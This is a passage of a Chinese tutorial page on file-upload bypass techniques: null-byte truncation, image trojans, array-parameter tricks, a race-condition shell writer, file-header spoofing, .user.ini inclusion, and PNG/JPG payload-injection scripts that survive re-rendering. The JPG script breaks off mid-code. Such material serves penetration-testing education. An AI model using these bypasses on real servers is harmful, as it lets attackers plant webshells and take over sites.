<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://x.x.x.x/test.jpgAAAphp </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码）</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="白名单相较比黑名单难绕只允许规定在白名单的内容才能上传">白名单（相较比黑名单难绕，只允许规定在白名单的内容才能上传）<a href="#白名单相较比黑名单难绕只允许规定在白名单的内容才能上传" class="hash-link" aria-label="白名单（相较比黑名单难绕，只允许规定在白名单的内容才能上传）的直接链接" title="白名单（相较比黑名单难绕，只允许规定在白名单的内容才能上传）的直接链接">​</a></h5>
<p>1.%00截断</p>
<p>攻击者上传文件 <code>shell.php%00.jpg</code>，服务器在处理文件名时，可能会将文件名截断为 <code>shell.php</code>，因为它在 <code>%00</code> 字符处停止读取字符串，如果服务器只检查文件名的扩展名部分（即 <code>.jpg</code>），它可能会认为这是一个合法的图片文件，并将其保存到服务器上，由于文件名被截断，实际上保存的文件是 <code>shell.php</code>，这是一个<code>PHP</code>脚本文件，而不是图片</p>
<p>2.图片马</p>
<p><code>edjpgcom.exe</code>生成或者使用<code>copy</code>命令生成</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">copy 1.jpg/b+2.php 3.jpg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>3.数组绕过</p>
<p>在PHP中，如果程序不严格验证用户输入，攻击者可能会通过提供非预期的数组结构来绕过安全限制。在该PHP代码示例中，存在一个安全漏洞，因为它直接使用了用户通过GET请求提供的<code>save_name</code>参数，而没有进行适当的验证</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$file =$_GET[&#x27;save_name&#x27;];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>reset($file)</code>函数返回数组的第一个元素，<code>$file[count($file) - 1]</code>尝试获取数组的最后一个元素</p>
<p>如果攻击者控制了<code>$file</code>数组，他们可以通过以下方式绕过文件类型检查：</p>
<p>攻击者可以发送一个数组，其第一个元素是期望的文件名，最后一个元素是<code>.php</code>（或其他可执行文件扩展名），由于Windows系统会自动删除文件名末尾的<code>.</code>，攻击者可以利用这一点来绕过文件扩展名的限制</p>
<p>假设攻击者发送以下GET请求：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">http://example.com/upload.php?save_name[0]=shell&amp;save_name[2]=php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最终文件为<code>shell.php</code></p>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="条件竞争">条件竞争<a href="#条件竞争" class="hash-link" aria-label="条件竞争的直接链接" title="条件竞争的直接链接">​</a></h5>
<p>条件竞争漏洞，发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。服务器对上传文件的操作大多数都是单线程处理，当我们执行多个线程时可以绕过一些服务器端的防御。 这里使用了unlink函数来删除不符合的文件，但代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问就能够成功执行</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;); ?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="文件头绕过检测文件头">文件头绕过（检测文件头）<a href="#文件头绕过检测文件头" class="hash-link" aria-label="文件头绕过（检测文件头）的直接链接" title="文件头绕过（检测文件头）的直接链接">​</a></h5>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">JPEG (JPG) 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: FF D8 FF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PNG 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 89 50 4E 47 0D 0A 1A 0A</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIF 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 47 49 46 38 (GIF89a) 或者 47 49 46 38 37 61 (GIF87a)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PDF 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: %PDF-</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZIP 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 50 4B 03 04 (压缩的ZIP文件) 或者 50 4B 05 06 (未压缩的ZIP文件)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Office 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Word文档 (.doc): D0 CF 11 E0 A1 B1 1A E1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Word文档 (.docx): 50 4B 03 04 14 00 06 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Excel电子表格 (.xls): D0 CF 11 E0 A1 B1 1A E1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Excel电子表格 (.xlsx): 50 4B 03 04 14 00 06 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PowerPoint演示文稿 (.ppt): D0 CF 11 E0 A1 B1 1A E1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PowerPoint演示文稿 (.pptx): 50 4B 03 04 14 00 06 00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TIFF 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 49 49 2A 00 (小端) 或者 4D 4D 00 2A (大端)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MP3 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 49 44 33 后面通常跟着 2E 00 或者其他标识版本和层的信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AVI 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 52 49 46 46 (RIFF) 紧接着是 41 56 49 20 (AVI )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BMP 文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">文件头: 42 4D</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GIF89a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php phpinfo();?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="userini文件">.user.ini文件<a href="#userini文件" class="hash-link" aria-label=".user.ini文件的直接链接" title=".user.ini文件的直接链接">​</a></h5>
<p><code>.user.ini</code>中两个中的配置<code>auto_prepend_file</code>和<code>auto_append_file</code>。这两个配置的意思就是：我们指定一个文件（如<code>1.jpg</code>），那么该文件就会被包含在要执行的<code>php</code>文件中（如<code>index.php</code>），相当于在<code>index.php</code>中插入一句：<code>require(./1.jpg)</code>。这两个设置的区别只是在于<code>auto_prepend_file</code>是在文件前插入，<code>auto_append_file</code>在文件最后插入。</p>
<p>利用<code>.user.ini</code>的前提是服务器开启了<code>CGI</code>或者<code>FastCGI</code>，并且上传文件的存储路径下有<code>index.php</code>可执行文件，<code>php</code>版本必须要在5以上</p>
<p>该<code>.user.ini</code>文件意思是无论访问当前目录下哪个 <code>php</code> 文件都会自动去包含 <code>1.jpg</code> 这个文件，得我们上传的图片格式的<code>webshell</code>也能够被解析，以此成功利用漏洞拿到<code>shell</code>权限</p>
<div class="language-ini codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ini codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">auto_prepend_file=1.jpg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auto_append_file=1.jpg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="二次渲染">二次渲染<a href="#二次渲染" class="hash-link" aria-label="二次渲染的直接链接" title="二次渲染的直接链接">​</a></h5>
<p>一些文件上传点，图片在上传之后，会对其进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，然后再保存，从而导致我们在传图片马时里面的内容被破坏，导致木马程序无法正常执行</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">参考文章：https://xz.aliyun.com/news/2337#toc-3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>gif</code>：先将普通的<code>gif</code>图片上传，会被渲染，渲染之后再下载下来，与原<code>git</code>图片对比，找到渲染前后没有变化的位置，然后在这些位置插入<code>php</code>一句话，再上传即可。</p>
<p><code>png</code>：索引类型图，由多个数据块组成，相对复杂，可以尝试将木马写入 <code>PLTE</code> 数据块或写入<code>IDAT</code>数据块</p>
<p>写入 <code>PLTE</code> 数据块：</p>
<p><code>php</code>底层在对<code>PLTE</code>数据块验证的时候,主要进行了<code>CRC</code>校验.所以可以在<code>chunk data</code>域插入<code>php</code>代码,然后重新计算相应的<code>crc</code>值并修改即可；这种方式只针对索引彩色图像的<code>png</code>图片才有效,在选取<code>png</code>图片时可根据<code>IHDR</code>数据块的<code>color type</code>辨别.<code>03</code>为索引彩色图像.</p>
<p>写入<code>IDAT</code>数据块：</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           0x66, 0x44, 0x50, 0x33);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$img = imagecreatetruecolor(32, 32);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for ($y = 0; $y &lt; sizeof($p); $y += 3) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   $r = $p[$y];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   $g = $p[$y+1];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   $b = $p[$y+2];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   $color = imagecolorallocate($img, $r, $g, $b);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   imagesetpixel($img, round($y / 3), 0, $color);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">imagepng($img,&#x27;./1.png&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>jpg</code>：很难成功实现，可尝试使用脚本生成图片上传尝试</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    /*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1) Upload an arbitrary image via secured files upload script</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2) Save the processed image and launch:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Since the most straightforward injection method is used, the following problems can occur:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    1) After the second processing the injected data may become partially corrupted.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Sergey Bobrov @Black2Fan.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    See also:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(&#x27;php-gd is not installed&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(!isset($argv[1])) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_error_handler(&quot;custom_error_handler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    for($pad = 0; $pad &lt; 1024; $pad++) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $nullbytePayloadSize = $pad;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $dis = new DataInputStream($argv[1]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $outStream = file_get_contents($argv[1]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $extraBytes = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $correctImage = TRUE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if($dis-&gt;readShort() != 0xFFD8) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            die(&#x27;Incorrect SOI marker&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $marker = $dis-&gt;readByte();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $size = $dis-&gt;readShort() - 2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $dis-&gt;skip($size);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if($marker === 0xDA) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $startPos = $dis-&gt;seek();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $outStreamTmp = </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    substr($outStream, 0, $startPos) . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    $miniPayload . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    substr($outStream, $startPos);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if($extraBytes !== 0) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    while((!$dis-&gt;eof())) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if($dis-&gt;readByte() === 0xFF) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            if($dis-&gt;readByte !== 0x00) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    $stopPos = $dis-&gt;seek() - 2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    $imageStreamSize = $stopPos - $startPos;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    $outStream = </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        substr($outStream, 0, $startPos) . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        $miniPayload . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        substr(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                substr($outStream, $startPos, $imageStreamSize),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            0,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                substr($outStream, $stopPos);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } elseif($correctImage) {</span><br></span><span 